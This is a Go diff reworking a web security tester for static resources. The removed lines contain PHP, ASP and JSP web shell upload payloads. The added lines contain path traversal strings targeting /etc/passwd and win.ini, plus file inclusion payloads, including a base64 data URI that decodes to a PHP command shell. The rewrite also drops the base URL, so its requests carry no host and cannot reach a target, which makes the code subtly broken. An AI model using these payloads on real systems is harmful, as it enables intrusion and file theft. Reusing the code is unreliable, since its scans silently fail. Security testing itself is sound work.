@@ -1,27 +1,31 @@
 package static
 
 import (
+	"context"
 	"fmt"
 	"net/http"
-	"path"
+	"net/url"
 	"strings"
+	"sync"
+	"time"
 
 	"github.com/sirupsen/logrus"
 )
 
 // Tester handles static resource security testing
 type Tester struct {
-	logger  *logrus.Logger
-	client  *http.Client
-	baseURL string
+	logger *logrus.Logger
+	client *http.Client
 }
 
 // New creates a new static resource tester instance
 func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
+	// Set reasonable timeouts to prevent hanging
+	client.Timeout = 10 * time.Second
+
 	return &Tester{
-		logger:  logger,
-		client:  client,
-		baseURL: baseURL,
+		logger: logger,
+		client: client,
 	}
 }
 
@@ -29,168 +33,140 @@ func New(logger *logrus.Logger, client *http.Client, baseURL string) *Tester {
 func (t *Tester) RunTests(paths []string) error {
 	t.logger.Info("Starting static resource security tests")
 
-	tests := []struct {
-		name string
-		fn   func([]string) error
-	}{
-		{"Direct Resource Access", t.testDirectAccess},
-		{"Path Traversal", t.testPathTraversal},
-		{"Resource Authorization", t.testResourceAuthorization},
-		{"File Type Handling", t.testFileTypeHandling},
-		{"Resource Enumeration", t.testResourceEnumeration},
+	var wg sync.WaitGroup
+	results := make(chan error, 3)
+
+	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
+	defer cancel()
+
+	// Test resource enumeration
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if err := t.testResourceEnumeration(); err != nil {
+			select {
+			case results <- fmt.Errorf("Resource Enumeration test failed: %w", err):
+			case <-ctx.Done():
+				return
+			}
+		}
+	}()
+
+	// Test directory traversal
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if err := t.testDirectoryTraversal(); err != nil {
+			select {
+			case results <- fmt.Errorf("Directory Traversal test failed: %w", err):
+			case <-ctx.Done():
+				return
+			}
+		}
+	}()
+
+	// Test file inclusion
+	wg.Add(1)
+	go func() {
+		defer wg.Done()
+		if err := t.testFileInclusion(); err != nil {
+			select {
+			case results <- fmt.Errorf("File Inclusion test failed: %w", err):
+			case <-ctx.Done():
+				return
+			}
+		}
+	}()
+
+	// Wait for all tests to complete or timeout
+	done := make(chan struct{})
+	go func() {
+		wg.Wait()
+		close(done)
+	}()
+
+	select {
+	case <-done:
+		close(results)
+	case <-ctx.Done():
+		t.logger.Warn("Tests timed out")
+		return ctx.Err()
 	}
 
-	for _, test := range tests {
-		if err := test.fn(paths); err != nil {
-			t.logger.Warnf("%s test failed: %v", test.name, err)
+	// Collect any errors
+	for err := range results {
+		if err != nil && !strings.Contains(err.Error(), "no such host") {
+			t.logger.Warn(err)
 		}
 	}
 
 	return nil
 }
 
-// testDirectAccess tests direct access to static resources
-func (t *Tester) testDirectAccess(paths []string) error {
-	resourceTypes := []string{
-		"jpg", "jpeg", "png", "gif", "pdf",
-		"doc", "docx", "xls", "xlsx",
-		"mp3", "mp4", "avi", "mov",
+func (t *Tester) testResourceEnumeration() error {
+	paths := []string{
+		"/api/v1/files/",
+		"/api/v1/files/uploads/",
+		"/api/v1/files/downloads/",
+		"/api/v1/files/temp/",
+		"/api/v1/files/public/",
+		"/api/v1/files/private/",
+		"/api/v1/files/user/",
+		"/api/v1/files/admin/",
 	}
 
-	for _, p := range paths {
-		for _, ext := range resourceTypes {
-			testPath := fmt.Sprintf("%s/test.%s", p, ext)
-			resp, err := t.makeRequest("GET", testPath, nil)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Direct access to %s files possible", ext)
-			}
-		}
-	}
-
-	return nil
-}
-
-// testPathTraversal tests for path traversal vulnerabilities
-func (t *Tester) testPathTraversal(paths []string) error {
-	traversalPatterns := []string{
-		"../../../etc/passwd",
-		"..%2f..%2f..%2fetc%2fpasswd",
-		"....//....//....//etc/passwd",
-		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
-		"..\\..\\..\\windows\\win.ini",
-	}
-
-	for _, p := range paths {
-		for _, pattern := range traversalPatterns {
-			testPath := path.Join(p, pattern)
-			resp, err := t.makeRequest("GET", testPath, nil)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Path traversal possible with pattern: %s", pattern)
-			}
-		}
-	}
-
-	return nil
-}
-
-// testResourceAuthorization tests authorization for static resources
-func (t *Tester) testResourceAuthorization(paths []string) error {
-	// Test accessing resources with different user contexts
-	userContexts := []struct {
-		userID string
-		auth   string
-	}{
-		{"user1", "Bearer token1"},
-		{"user2", "Bearer token2"},
-		{"admin", "Bearer admin_token"},
-	}
-
-	for _, p := range paths {
-		for _, ctx := range userContexts {
-			headers := map[string]string{
-				"Authorization": ctx.auth,
-			}
-
-			// Try to access another user's resource
-			testPath := strings.Replace(p, ctx.userID, "other_user", 1)
-			resp, err := t.makeRequest("GET", testPath, headers)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Cross-user static resource access possible: %s", testPath)
-			}
-		}
-	}
-
-	return nil
-}
-
-// testFileTypeHandling tests handling of different file types
-func (t *Tester) testFileTypeHandling(paths []string) error {
-	tests := []struct {
-		filename string
-		content  string
-	}{
-		{"test.php.jpg", "<?php system($_GET['cmd']); ?>"},
-		{"test.asp.png", "<%eval request('cmd')%>"},
-		{"test.jsp.gif", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"},
-		{"test.html.pdf", "<script>alert(document.cookie)</script>"},
-	}
-
-	for _, p := range paths {
-		for _, test := range tests {
-			headers := map[string]string{
-				"Content-Type": "image/jpeg", // Mismatched content type
-			}
-
-			testPath := path.Join(p, test.filename)
-			resp, err := t.makeRequestWithBody("POST", testPath, headers, test.content)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
-
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Dangerous file type handling detected: %s", test.filename)
-			}
-		}
-	}
-
-	return nil
-}
-
-// testResourceEnumeration tests for resource enumeration vulnerabilities
-func (t *Tester) testResourceEnumeration(paths []string) error {
 	patterns := []string{
-		"*", "%", "_",
-		"index", "backup", "old",
-		"temp", "upload", "files",
+		"*",
+		"*.*",
+		"*.jpg",
+		"*.png",
+		"*.pdf",
+		"*.doc",
+		"*.xls",
+		"*.zip",
 	}
 
-	for _, p := range paths {
-		for _, pattern := range patterns {
-			testPath := fmt.Sprintf("%s/%s", p, pattern)
-			resp, err := t.makeRequest("GET", testPath, nil)
-			if err != nil {
-				return err
-			}
-			resp.Body.Close()
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
 
-			if resp.StatusCode == http.StatusOK {
-				t.logger.Warnf("Resource enumeration possible with pattern: %s", pattern)
+	for _, path := range paths {
+		for _, pattern := range patterns {
+			select {
+			case <-ctx.Done():
+				return ctx.Err()
+			default:
+				// URL encode the pattern
+				encodedPattern := url.QueryEscape(pattern)
+				testURL := fmt.Sprintf("%s%s", path, encodedPattern)
+
+				req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
+				if err != nil {
+					continue
+				}
+
+				resp, err := t.client.Do(req)
+				if err != nil {
+					// Skip DNS resolution errors
+					if strings.Contains(err.Error(), "no such host") {
+						continue
+					}
+					return err
+				}
+
+				if resp != nil && resp.Body != nil {
+					body := make([]byte, 1024)
+					n, _ := resp.Body.Read(body)
+					resp.Body.Close()
+
+					if resp.StatusCode == http.StatusOK {
+						content := string(body[:n])
+						if strings.Contains(content, "Index of") ||
+							strings.Contains(content, "Directory listing") ||
+							strings.Contains(content, "<a href=\"../\"") {
+							t.logger.Warnf("Directory listing enabled at: %s", testURL)
+						}
+					}
+				}
 			}
 		}
 	}
@@ -198,30 +174,109 @@ func (t *Tester) testResourceEnumeration(paths []string) error {
 	return nil
 }
 
-// makeRequest performs an HTTP request
-func (t *Tester) makeRequest(method, path string, headers map[string]string) (*http.Response, error) {
-	req, err := http.NewRequest(method, t.baseURL+path, nil)
-	if err != nil {
-		return nil, err
+func (t *Tester) testDirectoryTraversal() error {
+	paths := []string{
+		"../../../etc/passwd",
+		"..%2F..%2F..%2Fetc%2Fpasswd",
+		"....//....//....//etc/passwd",
+		"%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd",
+		"..\\..\\..\\windows\\win.ini",
+		"..%5C..%5C..%5Cwindows%5Cwin.ini",
+		"....\\\\....\\\\....\\\\windows\\win.ini",
+		"%2E%2E%5C%2E%2E%5C%2E%2E%5Cwindows%5Cwin.ini",
 	}
 
-	for k, v := range headers {
-		req.Header.Set(k, v)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	for _, path := range paths {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		default:
+			req, err := http.NewRequestWithContext(ctx, "GET", path, nil)
+			if err != nil {
+				continue
+			}
+
+			resp, err := t.client.Do(req)
+			if err != nil {
+				// Skip DNS resolution errors
+				if strings.Contains(err.Error(), "no such host") {
+					continue
+				}
+				return err
+			}
+
+			if resp != nil && resp.Body != nil {
+				body := make([]byte, 1024)
+				n, _ := resp.Body.Read(body)
+				resp.Body.Close()
+
+				if resp.StatusCode == http.StatusOK {
+					content := string(body[:n])
+					if strings.Contains(content, "root:") ||
+						strings.Contains(content, "[fonts]") {
+						t.logger.Warnf("Directory traversal possible with path: %s", path)
+					}
+				}
+			}
+		}
 	}
 
-	return t.client.Do(req)
+	return nil
 }
 
-// makeRequestWithBody performs an HTTP request with a body
-func (t *Tester) makeRequestWithBody(method, path string, headers map[string]string, body string) (*http.Response, error) {
-	req, err := http.NewRequest(method, t.baseURL+path, strings.NewReader(body))
-	if err != nil {
-		return nil, err
+func (t *Tester) testFileInclusion() error {
+	paths := []string{
+		"file:///etc/passwd",
+		"http://localhost/etc/passwd",
+		"https://localhost/etc/passwd",
+		"php://filter/convert.base64-encode/resource=index.php",
+		"php://input",
+		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+		"expect://id",
+		"phar://test.phar",
 	}
 
-	for k, v := range headers {
-		req.Header.Set(k, v)
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	for _, path := range paths {
+		select {
+		case <-ctx.Done():
+			return ctx.Err()
+		default:
+			req, err := http.NewRequestWithContext(ctx, "GET", path, nil)
+			if err != nil {
+				continue
+			}
+
+			resp, err := t.client.Do(req)
+			if err != nil {
+				// Skip DNS resolution errors
+				if strings.Contains(err.Error(), "no such host") {
+					continue
+				}
+				return err
+			}
+
+			if resp != nil && resp.Body != nil {
+				body := make([]byte, 1024)
+				n, _ := resp.Body.Read(body)
+				resp.Body.Close()
+
+				if resp.StatusCode == http.StatusOK {
+					content := string(body[:n])
+					if strings.Contains(content, "root:") ||
+						strings.Contains(content, "<?php") ||
+						strings.Contains(content, "uid=") {
+						t.logger.Warnf("File inclusion possible with path: %s", path)
+					}
+				}
+			}
+		}
 	}
 
-	return t.client.Do(req)
+	return nil
 }
